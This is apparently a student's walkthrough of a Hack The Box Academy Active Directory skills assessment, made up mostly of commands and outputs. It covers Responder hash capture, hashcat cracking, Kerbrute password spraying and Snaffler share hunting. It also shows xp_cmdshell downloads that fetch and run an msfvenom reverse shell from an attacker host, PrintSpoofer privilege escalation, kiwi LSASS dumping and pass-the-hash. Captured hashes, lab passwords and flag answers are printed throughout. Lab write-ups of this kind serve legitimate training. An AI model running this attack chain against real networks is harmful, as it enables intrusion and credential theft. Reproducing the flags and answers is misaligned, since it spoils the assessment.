### Connection to Target

SSH
```go
sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.11.74
```

xfreerdp
```go
xfreerdp /v:10.129.12.127 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
```

#### Question 1: Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?


Log into the host. The user can sudo on everything. Use responder to grab a hash within the 172.16.6.0 subnet

```go
sudo responder -I ens224 -wfrv
```

Username and hash
```go
INLANEFREIGHT\AB920
```

```go
AB920::INLANEFREIGHT:6741b51d529201c7:F8653C1E3120B191A7DA708C0E363F8B:0101000000000000805C79559355D801CC5F7452B6AB182600000000020008005900560041004C0001001E00570049004E002D003000440031004C005700350056004C0037004100320004003400570049004E002D003000440031004C005700350056004C003700410032002E005900560041004C002E004C004F00430041004C00030014005900560041004C002E004C004F00430041004C00050014005900560041004C002E004C004F00430041004C0007000800805C79559355D801060004000200000008003000300000000000000000000000002000008FD5B9337124CEC895A3C0D2FD95F12FA421AA37FCF02A652FE227B46BB832DB0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

#### Question 2: What is this user's cleartext password?

Crack the hash
```go
hashcat -m 5600 ab920_hash /usr/share/wordlists/rockyou.txt --force -O
```

Answer:
```go
weasal
```

#### Question 3: Submit the contents of the C:\flag.txt file on MS01.

Find other hosts on the network from this host
```go
for i in {1..254} ;do (ping -c 1 172.16.7.$i | grep "bytes from" &) ;done
```

![[Pasted image 20260531005943.png]]

Determine which host is MS01

```go
172.16.7.50
```

NMAP scan for 172.16.7.50 shows this is MS01
![[Pasted image 20260531010900.png]]


```go
xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
```

Answer:
```go
aud1t_gr0up_m3mbersh1ps!
```

>[!Tip] Who is 172.16.7.60?
>

NMAP Scan for 172.16.7.60 shows it's name as `SQL01`
![[Pasted image 20260531011220.png]]

#### Question 4: Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.

```go
HTB_@cademy_stdnt!
```

```go
ssh -X htb-student@10.129.23.139
```


Head to your Kerbrute directory in `cd ~/tools/kerbrute` and execute`sudo make all` if you don't have a Windows executable ..

```go
scp PowerView.ps1 kerbrute_windows_amd64.exe htb-student@10.129.23.139:~/Desktop/HTB
```

```go
xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /drive:HTB,/home/htb-student/Desktop /smart-sizing:2400x1200
```

>[!Warning] "$DISPLAY environment variable not properly set" error message
> I got the above error message when attempting to RDP into the MS01 host. via xfreerdp. You must ssh via `ssh -X user@remote_host` to let SSH handle the tunneling via the -X or -Y flags. Or just use evil-winrm


```go
evil-winrm -i 172.16.7.50  -u 'AB920' -p 'weasal'
```


>[!Info] Try any of these and pair it with the password spraying technique

Export to username list

```go
Import-Module .\PowerView.ps1
```

```go
Set-ExecutionPolicy Bypass -Scope Process
```

```go
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content ad_users.txt 
```

```go
Get-Content .\admin_users.txt | select -First 10
```

Kerbrute Password Spray
```go
./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.7.50 admin_users.txt Welcome1
```

Answer
```go
BR086
```



#### Question 5: What is this user's password?

Answer:
```go
Welcome1
```

#### Question 6: Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?

Hunt for shares
```go
sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' --shares
```

![[Pasted image 20260609183841.png]]

Use the spider_plus module to dig through the readable IPC share. Check the output file in `/tmp/cme_spider_plus/172.16.7.50.json`
```GO
sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' --shares -M spider_plus --share 'Department Shares'
```

Cat the output file
```go
cat /tmp/cme_spider_plus/172.16.7.3.json
```

![[Pasted image 20260609184056.png]]

```go
sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' 'Department Shares\IT\Private\Development/web.config'
```

```go
smbclient //172.16.7.3/Department Shares/IT/Private/Development -U br086 -c "get web.config web.txt"
```

None of these worked. HTB wants me to use snaffler
```go
scp Snaffler.exe htb-student@10.129.23.139:~/Desktop
```

Connect to the MS01
```go
evil-winrm -i 172.16.7.3  -u 'br086' -p 'Welcome1'
```

```go
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

Answer
```go
D@ta_bAse_adm1n!
```

username
```go
netdb
```


#### Question 7: Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.

```go
python3 /usr/local/bin/mssqlclient.py inlanefrieght/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```

```go
EXEC xp_cmdshell 'type "C:\\Users\\Administrator\\Desktop\\flag.txt"';
```

I don't have the correct privileges
![[Pasted image 20260610065348.png]]

Verify privileges
```go
EXEC xp_cmdshell 'whoami /priv';
```

![[Pasted image 20260610071915.png]]


>[!Important] SeImpersonatePrivilege
The permission "SeImpersonatePrivilege" is enabled. It allows a process to assume the security context (identity and permissions) of another user or account. By default, it is assigned to local Administrators and Service accounts.
>
> The permission is often used by the Print Spooler to abuse special privileges and priv esc a standard user. To execute this attack generate an msfvenom payload and download the [PrintSpoofer](https://github.com/itm4n/printspoofer)

Download the executable and host the exploit
```go
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
```

```go
python3 -m http.server 8888
```


On the Pivot Target, download the PrintSpoofer32 exploit
```go
wget http://10.10.16.3:8888/PrintSpoofer32.exe
```

Generate msfvenom payload
```go
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=9999 -o shell.exe
```

Start netcat on htb-student
```go
nc -nlvp 9999
```

Connect to SQL01
```go
python3 /usr/local/bin/mssqlclient.py inlanefrieght/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```


On the SQL01 Host, download the files using certutil

Is there a public folder present?
```go
EXEC xp_cmdshell 'dir C:\Public\Users';
```

```go
EXEC xp_cmdshell 'dir C:\windows\temp';
```

```go
EXEC xp_cmdshell 'cd C:\Public\Users && dir';
```

```go
EXEC xp_cmdshell "certutil -urlcache -split -f http://172.16.7.240:8888/shell.exe C:\windows\temp\shell.exe";
```

```go
EXEC xp_cmdshell "certutil -urlcache -split -f http://172.16.7.240:8888/PrintSpoofer64.exe C:\windows\temp\PrintSpoofer64.exe;"
```


```go
EXEC xp_cmdshell 'powershell -Command "(New-Object System.Net.WebClient).DownloadFile(''http://172.16.7.240:8888/shell.exe'',''C:\windows\temp\shell.exe'')"';
```

```go
EXEC xp_cmdshell 'powershell -Command "(New-Object System.Net.WebClient).DownloadFile(''http://172.16.7.240:8888/PrintSpoofer64.exe'',''C:\windows\temp\PrintSpoofer64.exe'')"';
```

```go
EXEC xp_cmdshell 'powershell wget "http://172.16.7.240:8888/PrintSpoofer64.exe" -OutFile c:\windows\temp\\PrintSpoofer64.exe';
```


Execute
```go
EXEC xp_cmdshell "C:\windows\temp\PrintSpoofer64.exe -c C:\windows\temp\shell.exe"
```

Get the flag
```go
more C:\Users\administrator\Desktop\flag.txt
```

flag
```go
s3imp3rs0nate_cl@ssic
```

#### Question 8: Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.

>[!Important] Dan, remember to do a quick "progress review check!"
>- Do any of the previous exploits assist with the current assignment?
>- Did I add discovered users to the "User Creds" note?
>- Who has access to what?
>- What hosts have been compromised?
>- Which users have elevated privileges?

The previous challenge gave me system privileges on SQL01, I will need this to dump the LSASS secrets. With the meterpeter session still open, use kiwi to extract the administrator's hash

```go
load kiwi
```

```go
lsa_dump_creds
```

![[Pasted image 20260612151328.png]]

Using the admin's hash, RDP into MS01
```go
evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
```

```go
more C:\Users\administrator\Desktop\flag.txt
```

Answer:
```go
exc3ss1ve_adm1n_r1ights!
```

#### Question 9: Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?

Log into the SQL01 host with the admins hash
```go
evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
```


```go
Invoke-WebRequest -Uri "http://172.16.7.240:8888/PowerView.ps1" -OutFile "C:\Users\Administrator\Documents\PowerView.ps1"
```

>[!Note]
>Import PowerView and convert the Domain Admin's group name to a sid

On the pivot host...copy the the script to your current directory
```go
cp /usr/lib/python3/dist-packages/cme/data/powersploit/Recon/PowerView.ps1
```

```go
python3 -m http.server 8888
```

On SQL01, download the PowerView.ps1 file
```go
Invoke-WebRequest -Uri "http://172.16.7.240:8888/PowerView.ps1" -OutFile "C:\Users\Administrator\Documents\PowerView.ps1"
```

Importing PowerView
```go
Import-Module .\PowerView.ps1
```

Convert name to SID
```go
Convert-NameToSid "Domain Admins"
```

This gives me...
```go
S-1-5-21-3327542485-274640656-2609762496-512
```

```go
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $dagroupsid}
```

```go
Get-DomainObjectACL -Identity "S-1-5-21-3327542485-274640656-2609762496-512" -ResolveGUID
```

```go
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $dagroupsid} -Verbose
```

>[!Error] NONE OF THIS WORKED. USE INVEIGH INSTEAD!
> I had to download from their GitHub and scp to the pivot host
> ```go
> scp Inveigh.ps1 htb-student@10.129.27.32:/home/htb-student/Desktop
> ```

Host the file and grab from SQL01
```go
Invoke-WebRequest -Uri "http://172.16.7.240:8888/Inveigh.ps1" -OutFile "C:\Users\Administrator\Documents\Inveigh.ps1"
```

Import Inveigh.ps1
```go
Import-Module .\Inveigh.ps1
```

Start Inveigh with LLMNR and NBNS spoofing, output to console and write to a file
```go
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```



#### Question 10: Crack this user's password hash and submit the cleartext password as your answer.

Hash
```go
CT059::INLANEFREIGHT:1A6F56F2F779AA0C:4938D77DE286AB6CD823A7AF6C567DBC:0101000000000000ABBACDF7B4FADC013CEF5B7ED85B38130000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800ABBACDF7B4FADC010600040002000000080030003000000000000000000000000020000044D8CEF6EEFEDEE580E4972F8E575D1C23C915CE637B11E1FA600787CBE852640A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
```

Hash type is NetNTLMv2
```
hashid ct059-hash
```

Crack the hash
```go
hashcat -m 5600 ct059-hash /usr/share/wordlists/rockyou.txt
```

Answer:
```go
charlie1
```